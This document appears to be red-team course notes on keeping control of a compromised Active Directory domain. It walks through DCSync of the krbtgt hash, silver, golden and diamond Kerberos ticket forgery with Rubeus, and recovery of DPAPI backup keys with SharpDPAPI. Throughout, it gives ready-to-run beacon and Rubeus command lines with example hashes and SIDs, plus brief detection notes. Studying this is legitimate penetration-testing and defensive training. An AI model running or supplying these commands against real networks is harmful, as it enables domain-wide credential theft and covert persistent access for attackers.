if we have gained domain admin privs, we can now extract highly-sensitive authentication material to maintain persistence

dcsync:
    technique where an adversary leverages the directory replication service (DRS) protocol to pull replication data from a DC
        specifically targeting usernames and password hashes
    we can use mimikatz or the built in dcsync alias
    a common target would be obtaining the password hash for the krbtgt account
        once we have this, we can forge a valid TGT for any user in the domain since this is whats used to encrypt and sign TGS
        e.g. beacon> dcsync contoso.com CONTOSO\krbtgt
    OPSEC: as DRS is legitimately used, defenders must look for anomalous replication requests (logged as 4662)

ticket forgery:
    technique where an adversary uses stolen secrets to create their own keberos ticket offline and inject into logon session
    known as a silver ticket:
        kerberos ticket that has been forged using a service's secret and targets a specfic service
        once we compromise a machine, we can dump its password hash to forge service tickets
            e.g. PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:cifs/lon-db-1 /aes256:bc6fd6e8519b52e09f60961beeee083a441c25908e30a6c29b124b516e06945f /user:Administrator /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /nowrap
                where...
                    /service is the target service
                    /aes256 is the hash of the target computer account
                    /user is the user to impersonate
                    /domain is the FQDN of the copmuter's domain
                    /sid is the domain SID
            this will dump a service ticket!
        beacon> make_token CONTOSO\Administrator FakePass
        beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:[TGS]
        other uses for silver tickets:
            kerberoasting other services:
                say we have the plaintext password of domain account running MSSQL service
                we can use the service's secret to forge a service ticket impersonating a user who has sysadmin privs
                    convert the plaintext creds to its hash:
                        PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /user:mssql_svc /domain:CONTOSO.COM /password:Passw0rd!
                    forge ticket for MSSQLSvc/lon-db-1.contoso.com
                        PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:MSSQLSvc/lon-db-1.contoso.com:1433 /rc4:FC525C9683E8FE067095BA2DDC971889 /user:rsteel /id:1108 /groups:513,1106,1107,4602 /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /nowrap
                            where...
                                /id is the RID for the user with sysadmin privs
                                /groups is groups memberships (domain users, workstation admins, server admins, database admins)
                    impersonate user:
                        beacon> make_token CONTOSO\rsteel FakePass
                        beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:[TGT]
        OPSEC: silver tickets may be denied if PAC validation is enabled on the computer
               they may be detected as there is no TGS-REQ (4769) event logged before the TGS-REP (4624) since they are forged offline
               they may also be detected if they're forged with inaccurate or anomalous information
                e.g. domain name should be in all caps!
    another technique is forging a TGT offline that has been signed with the KDC's secret (obtained via DCSync)
    known as a golden ticket:
        using the KDC's secret:
            PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:[secret] /user:Administrator /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /nowrap
                where...
                    /aes256 is the hash for the krbtgt account
                    /user is the username to impersonate
                    /domain is the current domain
                    /sid is the current domain's SID
        impersonate:
            beacon> make_token CONTOSO\Administrator FakePass
            beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:[TGS] 
        OPSEC: same as silver ticket, where anomalous data would include lifetime data (mimikatz sets lifetime of ticket to 10 years)
    another technique will request a legit TGT for a user, then use the KDC's secret to decrypt the ticket, change the necessary data, re-encrypt and re-sign the TGT with the secret
    known as a diamond ticket:
        beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /krbkey:512920012661247c674784eef6e1b3ba52f64f28f57cf2b3f67246f20e6c722c /ticketuser:Administrator /ticketuserid:500 /domain:CONTOSO.COM /nowrap
            where...
                /tgtdeleg uses the TGT delegation trick to obtain a usable TGT
                /krbkey is the krbtgt's AES256 hash
                /ticketuser is the user we want to impersonate
                /ticketuserid is the impersonated user's RID
                /domain is the current domain
        we can verify this works by running the describe command before and after
            e.g. PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /servicekey:[krbtgt hash] /ticket:[TGT]

dpapi backup keys:
    a copy of the user's masterkey is encrypted with a "backup key" stored in AD
    obtaining this key allows them to decrypt all DPAPI blobs for any user in the domain
        beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe backupkey
    say we are cred hunting using SharpDPAPI:  
        beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials
    we can provide the backup key to decrypt these creds:
        beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials /pvk:[backup key]
